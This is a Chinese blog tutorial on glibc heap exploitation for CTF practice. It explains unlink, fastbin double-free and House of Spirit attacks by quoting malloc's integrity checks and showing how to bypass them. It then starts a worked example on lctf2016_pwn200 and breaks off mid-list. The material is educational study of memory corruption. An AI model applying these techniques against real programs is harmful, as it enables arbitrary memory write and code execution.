<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/08/linux-heap-exploit/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            linux 堆利用 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">linux 堆利用</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-08 03:15:01</span>
        <span class="mobile">2024-11-08 03:15:01</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-20 03:32:08</span>
            <span class="mobile">2024-11-20 03:32:08</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/pwn/linux-user-pwn/">linux user pwn</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux-user-pwn/">linux user pwn</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>19.3k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>93 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/debug_glibc" >debug glibc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：对于一些复杂的堆利用，可以先用支持源码调试的 libc 完成利用，然后改偏移打题目提供的 libc 。</p>
<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><p>假设正常情况下，每申请一个 chunk 会保存一个指向该 chunk 内存块的指针。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c24de3948290c69cc25a42ce707dee0e.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ><br>在 chunk1 伪造 fake chunk ，需要注意：</p>
<ol>
<li><p>为了绕过</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                 </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>

<p>令：</p>
<ul>
<li><code>fakeFD -&gt; bk == P1</code> &lt;&#x3D;&gt; <code>*(&amp;fakeFD + 0x18) == P1</code> &lt;&#x3D;&gt; <code>*fakeFD == &amp;P1 - 0x18</code></li>
<li><code>fakeBK -&gt; fd == P1</code> &lt;&#x3D;&gt; <code>*(&amp;fakeBK + 0x10) == P1</code> &lt;&#x3D;&gt; <code>*fakeBK == &amp;P1 - 0x10</code></li>
</ul>
</li>
<li><p>为了绕过</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">chunksize</span>(P) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(P)), <span class="number">0</span>))   </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);  </span><br></pre></td></tr></table></figure></div>

<p>要将 chunk2 的 prev_size 修改成 fake chunk 的 size。</p>
</li>
<li><p>为了绕过</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(P)) &amp;&amp;                                 </span><br><span class="line">    __builtin_expect(P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                             </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) ||               </span><br><span class="line">        __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))                 </span><br><span class="line">        <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>

<p>fake chunk 大小应在 small bin 范围。</p>
</li>
<li><p>为了能使得 chunk2 与 fake chunk 合并，chunk2 的 size 的 PREV_INUSE 位 为 0 ，且 chunk2 的大小不能在 fast bin 范围。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/31ad53b15d70e22f7ec4125df5450793.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
释放 chunk2 ，向前合并 fake chunk ，使得 fake chunk 进行 unlink 操作，按如下代码执行，因此 `P1 = &P1 - 0x18` 。	
    - `FD->bk = BK` <=> `P1 = &P1 - 0x10`
    - `BK->fd = FD` <=> `P1 = &P1 - 0x18`
![](images/7d5c7910c99de4ad253ff5e77e667dea.png)</li>
</ol>
<p>至此，整个指针数组被控制，可以实现任意地址读写。</p>
<h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><ul>
<li><p>先释放 chunk1，如果此时再次释放 chunk1 会触发对 double free 的检查：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于只检查链表中第一个 chunk 是否是待释放的 chunk ，因此可以通过先释放 chunk2 再释放 chunk1 绕过。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9d9da022304748498ca33674ba391ec2.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
</li>
<li><p>此时 malloc 获取 chunk1 等价于 UAF 漏洞。可以修改 chunk1 的 fd 指针指向特定地址，这样就可以在特定位置申请 chunk 。不过值得注意的是，由于存在如下检查，要保证申请 chunk 位置对应的 size 字段的值是正确的。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">fastbin_index</span>(<span class="built_in">chunksize</span>(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, errstr, <span class="built_in">chunk2mem</span>(victim));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>如下图所示，在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/928b3c5c57f4eb0192446216d5e1e16c.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ><br>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul>
<li><p>fake chunk 的 <code>ISMMAP</code> 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</span><br><span class="line">        mp_.mmap_threshold = chunksize(p);</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">        LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                   mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">ar_ptr = arena_for_chunk(p);</span><br><span class="line">_int_free(ar_ptr, p, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>fake chunk 地址需要对齐 <code>MALLOC_ALIGN_MASK</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">       multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>fake chunk 的 size 大小需要满足对应的 fastbin 的需求。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast())</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>fake chunk 的 <strong>next chunk</strong> 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">    __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">       of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">       after getting the lock.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">        assert(locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">    &#125;)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>pwndbg 的 try_free 命令可以检查是否能成功 free 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/dc5224340a5408c0a246535b4277c389.png"
                     
                ></p>
<p> 例题：lctf2016_pwn200</p>
<p>本上什么保护都没开，可以直接在堆栈中部署 shellcode 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/2c5fc176e33bedac5f98efe6513de64d.png"
                      alt="image-20220214184043313"
                ></p>
<ul>
<li><p><code>main</code> 函数：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_40079D</span>(a1, a2, a3);</span><br><span class="line">  <span class="built_in">sub_400A8E</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>主要调用 <code>sub_400A8E</code> 函数。</p>
</li>
<li><p><code>sub_400A8E</code> 函数：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_400A8E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;who are u?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;name[i], <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( name[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      name[i] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s, welcome to ISCC~ \n&quot;</span>, name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me your id ~~?&quot;</span>);</span><br><span class="line">  <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_400A29</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>name 存在 off-by-one 漏洞，通过输入 48 字节填充数据可以泄露栈地址 rbp 。</p>
</li>
<li><p>name 本身 48 字节大小可以恰好存下 pwntools 生成的 shellcode 。</p>
</li>
<li><p>获取的 id 写到了栈中，这个可以作为 fake chunk 下一个 chunk 的 size 字段。</p>
